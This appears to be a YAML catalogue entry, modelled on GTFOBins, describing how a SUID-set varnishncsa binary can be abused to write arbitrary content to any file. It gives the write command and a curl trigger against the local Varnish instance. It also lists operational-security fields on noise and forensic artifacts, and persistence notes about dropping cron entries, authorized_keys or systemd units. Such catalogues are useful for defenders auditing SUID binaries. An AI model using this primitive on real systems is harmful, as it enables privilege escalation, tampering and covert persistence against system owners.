---
name: varnishncsa
capabilities:
- write
required_permissions:
  level: suid
  notes: Requires SUID bit set on the binary.
difficulty: low
opsec:
  noise: low
  artifacts:
  - ~/.bash_history
  - File timestamps / inotify events on target paths
  notes: A running `varnishd` instance must be available.
persistence_potential: true
examples:
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
  notes: |-
    The command hangs, so the trigger command must be performed asynchronously or in another terminal:

    ```
    curl -H 'xxx: DATA' http://localhost:6081/xxxxxxxxxx
    ```
references:
- https://gtfobins.github.io/gtfobins/varnishncsa/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
